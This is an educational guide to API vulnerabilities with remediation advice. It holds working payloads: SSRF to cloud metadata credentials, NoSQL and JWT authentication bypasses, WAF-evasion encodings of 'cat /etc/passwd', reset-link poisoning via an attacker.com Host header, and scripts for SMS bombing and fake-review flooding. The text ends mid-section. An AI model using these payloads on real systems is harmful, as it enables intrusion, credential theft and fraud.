# 🔥 API Vulnerabilities Masterclass — Zero to Hero

> A complete guide covering API security fundamentals, OWASP API Top 10, exploitation techniques, bypass methods, tools, and remediation — designed for security engineers targeting FAANG-level roles.

---

## Table of Contents

1. [API Security Fundamentals](#1-api-security-fundamentals)
2. [API Attack Surface & Reconnaissance](#2-api-attack-surface--reconnaissance)
3. [OWASP API Security Top 10 (2023)](#3-owasp-api-security-top-10-2023)
4. [Beyond OWASP — Additional API Vulnerabilities](#4-beyond-owasp--additional-api-vulnerabilities)
5. [JWT Attacks — Deep Dive](#5-jwt-attacks--deep-dive)
6. [GraphQL-Specific Attacks](#6-graphql-specific-attacks)
7. [API Bypass Techniques](#7-api-bypass-techniques)
8. [API Security Tools Arsenal](#8-api-security-tools-arsenal)
9. [Secure API Design & Remediation](#9-secure-api-design--remediation)
10. [Interview Cheat Sheet](#10-interview-cheat-sheet)

---

## 1. API Security Fundamentals

### What is an API?

An **Application Programming Interface (API)** is a set of rules and protocols that allows software applications to communicate with each other. APIs expose functionality and data, acting as intermediaries between different systems.

### Types of APIs

| Type | Protocol | Data Format | Key Characteristics |
|------|----------|-------------|---------------------|
| **REST** | HTTP/HTTPS | JSON/XML | Stateless, resource-based URLs, CRUD via HTTP methods |
| **SOAP** | HTTP/SMTP | XML | Strict schema (WSDL), WS-Security, enterprise-heavy |
| **GraphQL** | HTTP/HTTPS | JSON | Single endpoint, client-defined queries, introspection |
| **gRPC** | HTTP/2 | Protocol Buffers | Binary serialization, high performance, bi-directional streaming |
| **WebSocket** | WS/WSS | Any | Full-duplex, persistent connection, real-time |

### API Security vs Traditional Web Security

| Aspect | Traditional Web App | API |
|--------|-------------------|-----|
| **Authentication** | Session cookies | Tokens (JWT, OAuth, API keys) |
| **Attack Surface** | Forms, URLs | Endpoints, parameters, headers, body |
| **Data Exposure** | Rendered HTML | Raw JSON/XML data |
| **Authorization** | Page-level access | Object-level + function-level |
| **Input** | Form fields | JSON body, query params, headers, path params |
| **Rate Limiting** | Less critical | Essential — automated abuse is easy |

### API Architecture Components

```
┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────┐
│   Client     │────▶│  API Gateway │────▶│  App Server │────▶│ Database │
│  (Mobile/    │     │  (Rate limit,│     │  (Business  │     │          │
│   Web/CLI)   │◀────│   Auth, WAF) │◀────│   Logic)    │◀────│          │
└─────────────┘     └──────────────┘     └─────────────┘     └──────────┘
                           │
                    ┌──────┴──────┐
                    │  Load       │
                    │  Balancer   │
                    └─────────────┘
```

**Each component is an attack surface:**
- **Client**: Token storage, certificate pinning bypass
- **API Gateway**: Misconfiguration, bypass via direct backend access
- **App Server**: Business logic flaws, injection, authorization
- **Database**: SQL injection, NoSQL injection, data exposure

### HTTP Methods & Their Security Implications

| Method | Purpose | Security Concern |
|--------|---------|-----------------|
| `GET` | Read resource | Data in URL (logged), caching, IDOR |
| `POST` | Create resource | Mass assignment, injection |
| `PUT` | Replace resource | Overwriting other users' data |
| `PATCH` | Partial update | Modifying restricted fields |
| `DELETE` | Remove resource | Unauthorized deletion |
| `OPTIONS` | CORS preflight | Information disclosure |
| `HEAD` | Headers only | Bypass body-based WAF rules |
| `TRACE` | Echo request | XST (Cross-Site Tracing) |

---

## 2. API Attack Surface & Reconnaissance

### Phase 1: API Discovery

#### Finding API Endpoints

**Passive Reconnaissance:**
```bash
# Search for API docs in common locations
/api/docs
/api/v1/docs
/swagger.json
/swagger/v1/swagger.json
/openapi.json
/api-docs
/v1/api-docs
/v2/api-docs
/graphql
/graphiql
/.well-known/openapi.json
/api/swagger-ui.html
/redoc

# Google Dorking
site:target.com inurl:api
site:target.com filetype:json "swagger"
site:target.com inurl:"/api/v"
site:target.com intitle:"API documentation"

# Wayback Machine
waybackurls target.com | grep -i "api\|swagger\|graphql\|rest"

# GitHub Search
"target.com" api_key
"target.com" endpoint
"target.com" /api/v
```

**Active Reconnaissance:**
```bash
# Directory brute-forcing for API endpoints
# Using ffuf
ffuf -u https://target.com/api/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,301,302,401,403

# Using kiterunner (purpose-built for API discovery)
kr scan https://target.com -w routes-large.kite

# Using Arjun (parameter discovery)
arjun -u https://target.com/api/v1/users -m GET POST
```

#### Analyzing API Documentation

When you find Swagger/OpenAPI docs:
1. **List all endpoints** — especially admin/internal ones
2. **Note authentication requirements** — which endpoints are public?
3. **Identify data models** — what fields exist? Hidden fields?
4. **Check deprecated endpoints** — often less secured
5. **Look for test/debug endpoints** — `/api/debug`, `/api/test`

### Phase 2: Authentication Mapping

```
Identify Auth Mechanism:
├── API Keys → Check if key in URL, header, or body
├── Bearer Tokens (JWT) → Decode, check algorithm, expiry
├── OAuth 2.0 → Map flows (auth code, implicit, client credentials)
├── Basic Auth → Base64 encoded (easy to intercept)
├── Session Cookies → CSRF potential
├── HMAC Signatures → Check if timestamp validated
└── mTLS → Certificate-based (strongest)
```

### Phase 3: Parameter Analysis

**Types of parameters to test:**
- **Path parameters**: `/api/users/{id}` → IDOR
- **Query parameters**: `?role=admin&debug=true` → privilege escalation
- **Body parameters**: Hidden fields in JSON → mass assignment
- **Headers**: `X-Forwarded-For`, `X-Custom-Auth` → bypass
- **Cookies**: Session tokens, preferences → tampering

---

## 3. OWASP API Security Top 10 (2023)

### API1:2023 — Broken Object Level Authorization (BOLA)

**Severity: CRITICAL** | **Prevalence: VERY HIGH** | **Exploitability: EASY**

#### What Is It?
BOLA (also known as IDOR — Insecure Direct Object Reference) occurs when an API endpoint allows a user to access or modify objects belonging to other users by manipulating object identifiers.

#### How It Works
```
Legitimate Request:
GET /api/v1/users/1001/orders     ← User 1001 sees their orders

Attack:
GET /api/v1/users/1002/orders     ← User 1001 sees User 1002's orders!
GET /api/v1/users/1003/orders     ← Enumerate all users' orders
```

#### Real-World Scenarios

**Scenario 1: Sequential IDs**
```http
GET /api/v1/invoices/10045 HTTP/1.1
Authorization: Bearer <user_token>
```
Change `10045` to `10046`, `10047`... to access other users' invoices.

**Scenario 2: UUIDs (still vulnerable!)**
```http
GET /api/v1/documents/550e8400-e29b-41d4-a716-446655440000
```
UUIDs are NOT authorization. If leaked (in URLs, emails, logs), they're just as exploitable.

**Scenario 3: Nested Objects**
```http
GET /api/v1/shops/123/orders
POST /api/v1/shops/456/products    ← Access another shop's products
```

**Scenario 4: Object Reference in Body**
```json
PUT /api/v1/transfer
{
  "from_account": "attacker_acc",
  "to_account": "attacker_acc",
  "amount": 1000,
  "source_account_id": "VICTIM_ID"  ← Changed!
}
```

#### Exploitation Techniques

1. **Sequential ID Enumeration**: Increment/decrement numeric IDs
2. **UUID Harvesting**: Extract UUIDs from responses, emails, URLs
3. **Parameter Swapping**: Replace your ID with victim's in any parameter
4. **HTTP Method Switching**: If GET is blocked, try PUT/PATCH/DELETE with same ID
5. **Wildcard/Null ID**: Try `*`, `null`, `0`, `-1`, `all`
6. **JSON Array Injection**: `{"id": [1001, 1002]}` — batch access

#### Bypass Techniques

```
# If numeric ID blocked, try:
/api/users/1002          ← blocked
/api/users/1002.json     ← bypass
/api/users/1002%00       ← null byte
/api/users/1002#         ← fragment
/api/users/1002/         ← trailing slash
/api/users/01002         ← leading zero
/api/users/1002.0        ← float
/api/users/1e3           ← scientific notation (1000)

# Wrapped object reference:
{"user_id": "1002"}              ← blocked
{"user_id": {"$eq": "1002"}}     ← NoSQL operator
{"user_id": ["1002"]}            ← array wrap

# HTTP method override:
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
```

#### Remediation
1. **Implement object-level authorization checks on EVERY endpoint**
2. Use authorization middleware that validates ownership
3. Prefer random, unpredictable object IDs (UUIDs) — but STILL check authorization
4. Implement proper access control policies (RBAC/ABAC)
5. Write automated tests that attempt cross-user access

---

### API2:2023 — Broken Authentication

**Severity: CRITICAL** | **Prevalence: HIGH** | **Exploitability: EASY**

#### What Is It?
API authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or exploit implementation flaws to assume other users' identities.

#### Attack Vectors

**1. Credential Stuffing / Brute Force**
```python
# No rate limiting on login endpoint
POST /api/v1/auth/login
{"email": "victim@example.com", "password": "password123"}
# Try thousands of passwords...
```

**2. Token-Based Attacks**
```
Weak JWT:
- Algorithm confusion (RS256 → HS256)
- None algorithm
- Weak signing key
- No expiration
- Token not invalidated on logout

API Key Issues:
- Key in URL (logged everywhere)
- Key shared across environments
- No key rotation
- Key grants excessive permissions
```

**3. Password Reset Flaws**
```http
# Predictable reset token
POST /api/v1/auth/reset-password
{"email": "victim@example.com"}

# Token is sequential or timestamp-based
GET /api/v1/auth/reset-password?token=1618534200
# Try: 1618534201, 1618534202...

# Host header injection
POST /api/v1/auth/forgot-password HTTP/1.1
Host: attacker.com                     ← Reset link sent to attacker's domain
{"email": "victim@example.com"}
```

**4. OAuth Flaws**
```
- Open redirect in callback URL
- State parameter missing (CSRF)
- Authorization code reuse
- Scope escalation
- Token leakage via referrer header
```

**5. Authentication Bypass**
```http
# Endpoint without auth check
GET /api/v1/internal/users           ← No auth required!

# Auth bypass via method change
GET /api/v1/admin/users → 401
POST /api/v1/admin/users → 200       ← Different method, no auth

# Auth bypass via path traversal  
GET /api/v1/user/../admin/users
GET /api/v1/user/..;/admin/users     ← Spring-specific
```

#### Remediation
1. Use standard authentication frameworks (OAuth 2.0 + PKCE)
2. Implement multi-factor authentication
3. Use strong password policies + credential breach detection
4. Implement anti-brute-force mechanisms (rate limiting, account lockout, CAPTCHA)
5. Use short-lived tokens with refresh token rotation
6. Invalidate tokens on password change/logout
7. Validate all redirect URIs strictly

---

### API3:2023 — Broken Object Property Level Authorization

**Severity: HIGH** | **Prevalence: HIGH** | **Exploitability: EASY**

#### What Is It?
This combines the old "Excessive Data Exposure" and "Mass Assignment." APIs expose object properties that users shouldn't access (read) or modify (write).

#### Part A: Excessive Data Exposure

The API returns more data than the client needs:

```json
// GET /api/v1/users/me
{
  "id": 1001,
  "name": "John",
  "email": "john@example.com",
  "role": "user",                    ← Should user see this?
  "ssn": "123-45-6789",             ← Definitely not!
  "password_hash": "$2b$10$...",     ← Critical leak!
  "internal_notes": "VIP customer",  ← Internal data
  "created_by_admin": "admin@corp.com"
}
```

**Exploitation:**
1. Call every API endpoint and inspect ALL response fields
2. Look for sensitive fields: password hashes, tokens, PII, internal IDs
3. Check different API versions: `/api/v1/users` vs `/api/v2/users`
4. Try adding `?include=all` or `?fields=*` or `?verbose=true`

#### Part B: Mass Assignment

The API allows users to set properties they shouldn't:

```json
// Normal profile update
PUT /api/v1/users/me
{"name": "John Updated"}

// Mass Assignment attack — adding extra fields
PUT /api/v1/users/me
{
  "name": "John Updated",
  "role": "admin",                 ← Escalate to admin!
  "is_verified": true,             ← Skip email verification!
  "account_balance": 999999,       ← Free money!
  "subscription_plan": "enterprise" ← Free upgrade!
}
```

**Finding Hidden Parameters:**
```bash
# 1. Check API docs for all model fields
# 2. Look at response bodies — any field returned might be settable
# 3. Try common privilege fields:
role, is_admin, admin, type, user_type, permissions,
group, verified, is_verified, email_verified, active,
approved, account_type, subscription, plan, credits,
balance, discount, price, rate
```

#### Remediation
1. Never rely on client-side filtering — filter at the API level
2. Define explicit allowlists of properties that can be read/written
3. Use DTOs (Data Transfer Objects) to control serialization
4. Implement schema validation on input
5. Return only the minimum data required

---

### API4:2023 — Unrestricted Resource Consumption

**Severity: HIGH** | **Prevalence: WIDESPREAD** | **Exploitability: EASY**

#### What Is It?
The API doesn't limit the amount of resources (CPU, memory, bandwidth, requests) a single client can consume, leading to DoS or financial damage.

#### Attack Vectors

**1. No Rate Limiting**
```python
# Flood the API
import requests
for i in range(100000):
    requests.get("https://target.com/api/v1/search?q=expensive_query")
```

**2. Resource-Expensive Operations**
```json
// Request a huge page size
GET /api/v1/users?page_size=100000

// Complex search/filter
GET /api/v1/search?q=a&include=comments,followers,posts,likes&depth=10

// GraphQL complexity attack
{
  users(first: 1000) {
    friends(first: 1000) {
      friends(first: 1000) {
        name
      }
    }
  }
}
```

**3. File Upload Abuse**
```http
// No file size limit
POST /api/v1/upload
Content-Type: multipart/form-data
[10GB file]

// Zip bomb
POST /api/v1/upload
[42.zip — 42KB compressed, 4.5PB decompressed]
```

**4. SMS/Email Bombing**
```python
# Trigger expensive operations
for i in range(10000):
    requests.post("/api/v1/auth/send-otp", json={"phone": "+1234567890"})
    # Each request costs money (SMS charges)
```

#### Remediation
1. Implement rate limiting per user/IP/API key
2. Set maximum pagination sizes (`page_size` ≤ 100)
3. Limit request body size and upload file size
4. Set timeouts for all operations
5. Implement query complexity analysis (especially for GraphQL)
6. Use API quotas and spending limits
7. Implement CAPTCHA for expensive operations

---

### API5:2023 — Broken Function Level Authorization

**Severity: CRITICAL** | **Prevalence: MODERATE** | **Exploitability: EASY**

#### What Is It?
The API doesn't properly verify that the user has permission to execute a specific function/action. Different from BOLA (object-level) — this is about *function-level* access.

#### Attack Vectors

**1. Admin Endpoint Discovery**
```bash
# Common admin API paths
/api/v1/admin/users
/api/v1/admin/settings
/api/v1/internal/metrics
/api/v1/management/health
/api/admin/delete-user
/api/v1/users/all         ← list ALL users (admin function)
/api/v1/system/config
/api/v1/debug/vars
```

**2. HTTP Method Tampering**
```http
# Regular user can GET but not DELETE? Try anyway!
GET /api/v1/users/1001        → 200 OK
DELETE /api/v1/users/1001     → 200 OK  ← No function-level auth check!

# Or change method to access admin functions
GET /api/v1/users             → Returns own data
POST /api/v1/users            → Creates new user (admin only?) → WORKS!
```

**3. Parameter-Based Access Control**
```http
# Role in request
GET /api/v1/dashboard?role=user    → User dashboard
GET /api/v1/dashboard?role=admin   → Admin dashboard!

# Hidden admin parameter
POST /api/v1/register
{"username": "attacker", "password": "pass", "role": "admin"}
```

**4. API Version Rollback**
```http
# v2 has proper auth checks
GET /api/v2/admin/users → 403 Forbidden

# v1 might not
GET /api/v1/admin/users → 200 OK  ← Old version lacks auth!
```

#### Remediation
1. Implement role-based access control (RBAC) consistently
2. Deny by default — explicitly allow required functions per role
3. Ensure admin functions are separated and properly gated
4. Test all HTTP methods on all endpoints
5. Remove or properly secure old API versions

---

### API6:2023 — Unrestricted Access to Sensitive Business Flows

**Severity: HIGH** | **Prevalence: MODERATE** | **Exploitability: MODERATE**

#### What Is It?
The API exposes business flows without considering how automated/excessive use could harm the business. Not a technical bug — a business logic abuse.

#### Real-World Examples

**1. Ticket Scalping**
```python
# Bot buys all concert tickets before humans can
for ticket_id in available_tickets:
    requests.post("/api/v1/purchase", json={
        "ticket_id": ticket_id,
        "payment": "saved_card_123"
    })
```

**2. Referral Abuse**
```python
# Create fake accounts for referral bonuses
for i in range(1000):
    requests.post("/api/v1/register", json={
        "email": f"fake{i}@tempmail.com",
        "referral_code": "ATTACKER_CODE"
    })
```

**3. Review/Rating Manipulation**
```python
# Flood positive reviews for own product
for _ in range(500):
    requests.post("/api/v1/reviews", json={
        "product_id": "my_product",
        "rating": 5,
        "text": generate_fake_review()
    })
```

**4. Price Manipulation / Coupon Abuse**
```http
# Apply multiple coupons
POST /api/v1/cart/apply-coupon
{"code": "SAVE20"}
POST /api/v1/cart/apply-coupon
{"code": "SAVE20"}    ← Same coupon applied twice!

# Race condition in redemption
# Send 100 concurrent requests to redeem the same one-time coupon
```

#### Remediation
1. Identify business flows that could be abused if automated
2. Implement device fingerprinting and behavioral analysis
3. Use CAPTCHA for sensitive actions
4. Detect and block bot-like patterns
5. Implement business-level rate limiting (not just technical)
6. Use proof-of-work or waiting periods

---

### API7:2023 — Server Side Request Forgery (SSRF)

**Severity: HIGH** | **Prevalence: MODERATE** | **Exploitability: EASY**

#### What Is It?
The API fetches a remote resource based on user-supplied URLs without proper validation, allowing attackers to make the server send requests to unintended destinations.

#### Attack Vectors

**1. Basic SSRF**
```json
POST /api/v1/webhooks
{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
// Server fetches AWS metadata → credentials leaked!
```

**2. Cloud Metadata Services**
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Digital Ocean
http://169.254.169.254/metadata/v1/
```

**3. Internal Service Access**
```json
POST /api/v1/preview
{
  "url": "http://localhost:8080/admin"         // Internal admin panel
  "url": "http://10.0.0.1:6379/"              // Internal Redis
  "url": "http://internal-api.corp:3000/users" // Internal API
}
```

**4. Protocol Smuggling**
```
file:///etc/passwd
dict://localhost:6379/INFO
gopher://localhost:6379/_SET%20key%20value
ftp://internal-ftp:21/secret.txt
```

#### SSRF Bypass Techniques
```bash
# IP representation bypasses
http://127.0.0.1    → blocked
http://0x7f000001   → hex
http://2130706433   → decimal
http://0177.0.0.1   → octal
http://127.1        → short form
http://[::1]        → IPv6 loopback
http://0.0.0.0      → all interfaces
http://127.0.0.1.nip.io    → DNS rebinding
http://localtest.me         → resolves to 127.0.0.1

# URL parsing tricks
http://attacker.com@127.0.0.1     → userinfo confusion
http://127.0.0.1#@attacker.com    → fragment confusion
http://127.0.0.1%2523@attacker.com → double encoding

# Redirect-based bypass
http://attacker.com/redirect?url=http://169.254.169.254/
# Attacker's server returns 302 to metadata endpoint

# DNS rebinding
# First resolution: attacker's IP (passes validation)
# Second resolution: 127.0.0.1 (actual fetch hits internal)
```

#### Remediation
1. Validate and sanitize all user-supplied URLs
2. Use allowlists for permitted domains/IPs
3. Block requests to private IP ranges and metadata endpoints
4. Disable unnecessary URL schemes (only allow http/https)
5. Don't return raw responses to users
6. Use IMDSv2 (token-based) for cloud metadata
7. Implement network segmentation

---

### API8:2023 — Security Misconfiguration

**Severity: HIGH** | **Prevalence: WIDESPREAD** | **Exploitability: EASY**

#### What Is It?
The API or its supporting infrastructure (servers, frameworks, cloud services) is misconfigured, exposing it to attacks.

#### Common Misconfigurations

**1. CORS Misconfiguration**
```http
# Overly permissive CORS
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true    ← DANGEROUS COMBO!

# Reflected Origin
Origin: https://attacker.com
→ Access-Control-Allow-Origin: https://attacker.com

# Null origin allowed
Origin: null
→ Access-Control-Allow-Origin: null
```

**2. Verbose Error Messages**
```json
// Production API returning stack traces
{
  "error": "PG::UndefinedColumn: ERROR:  column users.password does not exist\n
    LINE 1: SELECT users.* FROM \"users\" WHERE users.password = 'test'\n
    /app/models/user.rb:15:in `authenticate'\n
    /app/controllers/auth_controller.rb:8:in `login'"
}
// Reveals: database type, table structure, file paths, framework
```

**3. Unnecessary HTTP Methods Enabled**
```bash
# OPTIONS reveals allowed methods
OPTIONS /api/v1/users HTTP/1.1
→ Allow: GET, POST, PUT, DELETE, TRACE, OPTIONS

# TRACE enables XST attacks
TRACE /api/v1/users HTTP/1.1
```

**4. Default Credentials / Debug Endpoints**
```bash
# Default credentials
admin:admin
admin:password
test:test

# Debug endpoints left in production
/api/v1/debug
/api/v1/health
/api/v1/metrics
/api/v1/env
/api/actuator (Spring Boot)
/api/__debug__ (Django)
/graphql/playground
```

**5. Missing Security Headers**
```
Missing:
- Strict-Transport-Security (HSTS)
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- Content-Security-Policy
- Cache-Control: no-store (for sensitive responses)
```

**6. TLS/SSL Issues**
```
- HTTP allowed (no redirect to HTTPS)
- Weak cipher suites (RC4, DES, 3DES)
- Old TLS versions (TLS 1.0, 1.1)
- Missing certificate pinning (mobile APIs)
- Self-signed certificates in production
```

#### Remediation
1. Harden all environments (dev, staging, production) identically
2. Implement strict CORS policies with explicit origins
3. Disable debug/test endpoints in production
4. Remove default credentials
5. Implement proper error handling (generic messages to users)
6. Enable all security headers
7. Regular security configuration reviews
8. Automate configuration checks in CI/CD

---

### API9:2023 — Improper Inventory Management

**Severity: MODERATE** | **Prevalence: WIDESPREAD** | **Exploitability: EASY**

#### What Is It?
Organizations expose multiple API versions, environments, or undocumented endpoints without proper management, creating shadow APIs.

#### Attack Vectors

**1. Old API Versions**
```bash
# Current version has proper security
GET /api/v3/users → Requires auth + RBAC

# Old versions still running
GET /api/v2/users → Weaker auth
GET /api/v1/users → No auth!
GET /api/beta/users → Debug mode
```

**2. Environment Exposure**
```bash
# Production is locked down, but...
https://api.target.com/users → secured
https://api-staging.target.com/users → open!
https://api-dev.target.com/users → open!
https://api-test.target.com/users → open!
https://sandbox.target.com/api/users → open!
https://internal-api.target.com/users → exposed!
```

**3. Undocumented/Shadow APIs**
```bash
# APIs not in documentation but accessible
/api/v1/internal/config
/api/v1/admin/backdoor
/api/mobile/v1/users        ← Mobile API with less security
/api/partner/v1/data         ← Partner API exposed
/legacy/api/users            ← Forgotten legacy API
```

**4. Host Header Discovery**
```bash
# Different virtual hosts
Host: api.target.com
Host: internal.target.com
Host: admin.target.com
```

#### Remediation
1. Maintain a complete API inventory (all versions, environments)
2. Decommission old API versions
3. Use API gateway to control access
4. Never expose non-production environments publicly
5. Use OpenAPI/Swagger specs as source of truth
6. Automate API discovery and inventory scanning

---

### API10:2023 — Unsafe Consumption of APIs

**Severity: HIGH** | **Prevalence: MODERATE** | **Exploitability: MODERATE**

#### What Is It?
Developers tend to trust data from third-party APIs more than user input, applying weaker security standards. Attackers can compromise or impersonate third-party services.

#### Attack Vectors

**1. Third-Party API Data Trust**
```python
# Trusting third-party data without validation
response = requests.get("https://partner-api.com/user-data")
user_data = response.json()

# Directly inserting into database — SQL injection via 3rd party!
db.execute(f"INSERT INTO users VALUES ('{user_data['name']}')")
```

**2. Redirect Following**
```python
# Blindly following redirects from 3rd party
response = requests.get(third_party_url, allow_redirects=True)
# Redirected to: http://169.254.169.254/... (SSRF via 3rd party)
```

**3. Supply Chain Attacks**
```
Compromised third-party API returns malicious data:
- XSS payloads in response fields
- SQL injection in data fields
- Oversized responses (DoS)
- Manipulated business data (wrong prices, quantities)
```

#### Remediation
1. Treat ALL external API data as untrusted user input
2. Validate and sanitize third-party responses
3. Use allowlists for redirect URLs
4. Implement timeouts for third-party calls
5. Rate limit outgoing API calls
6. Monitor third-party API behavior for anomalies
7. Use TLS for all third-party communications

---

## 4. Beyond OWASP — Additional API Vulnerabilities

### Race Conditions (TOCTOU)

**Time-of-Check to Time-of-Use attacks** exploit the gap between validation and execution.

```python
# Exploit: Double-spend a coupon
import asyncio, aiohttp

async def redeem_coupon(session, coupon):
    return await session.post("/api/v1/redeem", json={"code": coupon})

async def exploit():
    async with aiohttp.ClientSession() as session:
        # Send 50 concurrent requests
        tasks = [redeem_coupon(session, "ONCE50") for _ in range(50)]
        results = await asyncio.gather(*tasks)
        # Multiple 200 OK responses = coupon redeemed multiple times!
```

**Common targets:**
- Coupon/voucher redemption
- Money transfers
- Vote/like systems
- Inventory/stock purchases
- Account creation (referral bonuses)

**Remediation:** Database-level locking, idempotency keys, atomic operations

---

### HTTP Parameter Pollution (HPP)

Inject duplicate parameters to bypass validation:

```http
# Server treats duplicate params differently:
# Express (Node.js): takes LAST value
# PHP: takes LAST value  
# Python (Flask): takes FIRST value
# ASP.NET: concatenates with comma
# Java (Tomcat): takes FIRST value

# Bypass example:
POST /api/v1/transfer
amount=100&to=attacker&amount=10000
# If WAF checks first "amount" (100) but server uses last (10000)

# URL parameter pollution
/api/v1/users?role=user&role=admin
# Depending on backend, "admin" might be used
```

---

### NoSQL Injection

```json
// MongoDB operator injection
POST /api/v1/login
{
  "username": {"$ne": ""},           // Not equal to empty = matches any user
  "password": {"$gt": ""}            // Greater than empty = matches any password
}

// Extract data with regex
{
  "username": "admin",
  "password": {"$regex": "^a"}       // Password starts with 'a'?
}

// Aggregation pipeline injection
{
  "filter": {"$where": "sleep(5000)"} // NoSQL DoS
}
```

**Remediation:** Input validation, parameterized queries, disable `$where`

---

### API Key Exposure

```bash
# Common locations for leaked API keys:
- URL query parameters (logged in server logs, browser history)
- Client-side JavaScript source code
- Mobile app decompilation
- Git commit history
- Error messages
- Browser developer tools (Network tab)
- Public S3 buckets
- Documentation sites

# GitHub search for API keys
"AKIA" (AWS Access Key prefix)
"Authorization: Bearer"
"api_key" OR "apikey" OR "api-key"
"client_secret"
```

---

### Verb Tampering

```http
# Bypass access controls by changing HTTP method
GET /api/v1/admin/users → 403 Forbidden
POST /api/v1/admin/users → 200 OK!
PATCH /api/v1/admin/users → 200 OK!

# Method override headers
POST /api/v1/admin/users
X-HTTP-Method-Override: GET
X-HTTP-Method: DELETE
X-Method-Override: PUT
```

---

### Content Type Manipulation

```http
# Server might parse differently based on Content-Type
# Original (JSON):
POST /api/v1/users
Content-Type: application/json
{"name": "test", "role": "admin"}

# Try XML:
POST /api/v1/users
Content-Type: application/xml
<user><name>test</name><role>admin</role></user>

# Try form-encoded:
POST /api/v1/users
Content-Type: application/x-www-form-urlencoded
name=test&role=admin

# Different parsers may have different vulnerabilities!
```

---

## 5. JWT Attacks — Deep Dive

### JWT Structure
```
Header.Payload.Signature

eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MTg1MzQ1MDAsImV4cCI6MTYxODUzODEwMH0.signature

Header: {"alg": "RS256"}
Payload: {"sub": "1001", "role": "user", "iat": 1618534500, "exp": 1618538100}
```

### Attack 1: Algorithm None
```json
// Change algorithm to "none" — signature not verified
Header: {"alg": "none", "typ": "JWT"}
Payload: {"sub": "1001", "role": "admin"}
// Remove signature, send: header.payload.
```

### Attack 2: Algorithm Confusion (RS256 → HS256)
```python
# Server uses RS256 (asymmetric: public + private key)
# Attack: Switch to HS256 (symmetric) and sign with the PUBLIC key
# Server verifies with public key using HMAC — signature matches!

import jwt

public_key = open("public.pem").read()
token = jwt.encode(
    {"sub": "1001", "role": "admin"},
    public_key,
    algorithm="HS256"
)
```

### Attack 3: Weak Secret Key
```bash
# Brute-force the HMAC secret
# Using hashcat:
hashcat -m 16500 jwt_token.txt wordlist.txt

# Using jwt-cracker:
jwt-cracker <token> [alphabet] [max_length]

# Common weak secrets:
secret, password, 123456, HS256, key, jwt_secret
```

### Attack 4: JWK Header Injection
```json
// Inject attacker's public key in the JWT header
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker_public_key_n>",
    "e": "AQAB"
  }
}
// Server uses the embedded key to verify → attacker controls verification!
```

### Attack 5: KID (Key ID) Manipulation
```json
// SQL injection via kid
{"alg": "HS256", "kid": "key1' UNION SELECT 'attacker-secret' -- "}

// Path traversal via kid  
{"alg": "HS256", "kid": "../../../dev/null"}
// Sign with empty string (null file)

// Directory traversal
{"alg": "HS256", "kid": "../../etc/hostname"}
// Sign with the hostname value
```

### Attack 6: Token Not Invalidated
```
1. User logs out → token should be invalid
2. Token is still accepted after logout
3. Token is still accepted after password change
4. Expired tokens accepted (no expiry check)
5. Refresh token reuse after rotation
```

### JWT Testing Checklist
```
□ Try "alg": "none"
□ Try algorithm switch (RS256 → HS256)
□ Brute-force weak HMAC secrets
□ Modify payload claims (role, sub, admin)
□ Test token expiration handling
□ Test logout invalidation
□ Check for JWK/JKU header injection
□ Test KID parameter for injection
□ Try using expired tokens
□ Test refresh token rotation
□ Check if signature is actually verified
```

---

## 6. GraphQL-Specific Attacks

### Introspection Query (Information Disclosure)
```graphql
# Full schema dump
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

### Batch Query Attack
```graphql
# Brute-force OTP via batching
[
  {"query": "mutation { verifyOTP(code: \"0000\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"0001\") { success } }"},
  {"query": "mutation { verifyOTP(code: \"0002\") { success } }"},
  ... # Send 10000 mutations in one request!
]
```

### Query Depth Attack (DoS)
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {  # Infinite depth → server crash
              name
            }
          }
        }
      }
    }
  }
}
```

### Field Suggestion Exploitation
```graphql
# Typo reveals valid fields
{ user { pasword } }
# Error: "Did you mean 'password'?"
# Error: "Did you mean 'password_hash'?"
```

### Alias-Based Attacks
```graphql
# Bypass rate limiting with aliases
{
  a1: login(user: "admin", pass: "password1") { token }
  a2: login(user: "admin", pass: "password2") { token }
  a3: login(user: "admin", pass: "password3") { token }
  # 1000 login attempts in a single request!
}
```

### GraphQL Injection
```graphql
# If inputs are concatenated into queries
mutation {
  createUser(name: "test\", role: \"admin") {
    id
  }
}
```

### GraphQL Remediation
1. Disable introspection in production
2. Implement query depth limiting
3. Implement query complexity analysis
4. Rate limit by query complexity, not just requests
5. Use persistent/allowlisted queries
6. Validate all inputs
7. Implement proper authorization on every resolver

---

## 7. API Bypass Techniques

### WAF Bypass for APIs

```bash
# Content-Type confusion
Content-Type: application/json                    → blocked
Content-Type: application/json; charset=utf-8     → bypass
Content-Type: application/x-www-form-urlencoded   → bypass (different parser)
Content-Type: text/plain                          → bypass

# Encoding bypasses
{"cmd": "cat /etc/passwd"}                 → blocked
{"cmd": "cat /etc/pass\u0077d"}            → Unicode escape
{"cmd": "cat /etc/pas%73wd"}               → URL encoding in JSON
{"cmd": "Y2F0IC9ldGMvcGFzc3dk"}            → Base64 (if server decodes)

# Chunked transfer encoding
Transfer-Encoding: chunked
POST /api/v1/search
7\r\n
{"cmd"\r\n
5\r\n
: "ls\r\n
2\r\n
"}\r\n
0\r\n

# JSON structure manipulation
{"user": "admin"}                → blocked
{"user": "admin", "user": "admin"}  → duplicate key
{"\u0075ser": "admin"}            → Unicode key
{"user"  :   "admin"}             → extra whitespace
```

### Rate Limiting Bypass

```bash
# IP rotation
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12
True-Client-IP: 13.14.15.16
X-Client-IP: 17.18.19.20

